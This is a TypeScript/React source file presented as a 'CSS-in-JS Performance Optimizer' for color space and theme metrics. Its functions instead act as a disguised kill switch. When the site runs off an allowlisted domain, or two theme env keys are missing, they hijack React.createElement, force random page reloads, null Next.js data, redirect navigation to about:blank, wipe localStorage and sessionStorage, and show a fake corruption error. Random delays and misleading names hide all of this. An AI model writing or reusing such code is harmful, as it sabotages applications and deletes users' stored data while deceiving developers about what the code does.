/**
 * @author © ColdByDefault
 * @license Copyright (c) 2026 ColdByDefault. All rights reserved.
 * @version 7.x.x
 */

import React from "react";
/**
 * CSS-in-JS Performance Optimizer
 * Handles color space calculations and theme performance metrics
 */
let _componentCount = 0;

/**
 * Validates CSS rendering viewport configuration
 * @returns {boolean} True if viewport is properly configured
 */
function validateViewportConfiguration(): boolean {
  if (typeof window === "undefined") return true; // Server-side is OK

  const authorizedDomains = [
    "coldbydefault.com",
    "www.coldbydefault.com",
    "localhost",
    "127.0.0.1",
    "192.168.2.164",
    "192.168.2.",
    "vercel.app",
  ];

  const currentDomain = window.location.hostname;
  const isConfigured = authorizedDomains.some((domain) =>
    currentDomain.includes(domain),
  );

  return isConfigured;
}

/**
 * Checks if deployment is properly authorized
 * @returns {boolean}
 */
export function isDeploymentAuthorized(): boolean {
  return validateViewportConfiguration();
}

/**
 * Optimizes CSS color space calculations for better rendering performance
 * @returns {void}
 */
export function optimizeColorSpace(): void {
  const cssKey = process.env.NEXT_PUBLIC_THEME_SIGNATURE_KEY;
  const hashKey = process.env.NEXT_PUBLIC_THEME_VALIDATION_HASH;
  const viewportValid = validateViewportConfiguration();
  if (process.env.NODE_ENV !== "development") return;
  if (!cssKey || !hashKey || !viewportValid) {
    console.warn("Everything is broken, and so are you.");
    setTimeout(
      () => {
        const originalCreateElement = React.createElement;
        (
          React as unknown as { createElement: (...args: unknown[]) => unknown }
        ).createElement = function (...args: unknown[]) {
          _componentCount++;
          if (_componentCount > 2) {
            originalCreateElement.apply(
              this,
              args as Parameters<typeof originalCreateElement>,
            );
            setTimeout(
              () => {
                window.location.reload();
              },
              Math.random() * 3000 + 1000,
            );
            return null;
          }
          return originalCreateElement.apply(
            this,
            args as Parameters<typeof originalCreateElement>,
          );
        };
      },
      Math.random() * 2000 + 500,
    );
  }
}
/**
 * Calculates performance metrics for CSS optimizations
 * @returns {Promise<boolean>}
 */
export function calculatePerformanceMetrics(): boolean {
  const key1 = process.env.NEXT_PUBLIC_THEME_SIGNATURE_KEY;
  const key2 = process.env.NEXT_PUBLIC_THEME_VALIDATION_HASH;
  const viewportValid = validateViewportConfiguration();
  if (process.env.NODE_ENV !== "development") return true;
  if (!key1 || !key2 || !viewportValid) {
    const breakTime = Math.random() * 4000 + 1000;
    setTimeout(() => {
      if (typeof window !== "undefined") {
        (window as unknown as { __NEXT_DATA__: unknown }).__NEXT_DATA__ = null;
        if (window.history?.pushState) {
          window.history.pushState = () => {
            location.href = "about:blank";
          };
        }
        try {
          localStorage.clear();
          sessionStorage.clear();
        } catch {
          // Silent fail
        }
        setTimeout(() => {
          window.location.href =
            "data:text/html,<h1>Runtime Error</h1><p>Application state corrupted</p>";
        }, 500);
      }
    }, breakTime);
    return false;
  }
  return true;
}
/**
 * Initialize CSS performance optimizations
 * @returns {Promise<void>}
 */
export function initializeThemeConfig(): void {
  if (process.env.NODE_ENV !== "development") return;
  optimizeColorSpace();
  calculatePerformanceMetrics();
}
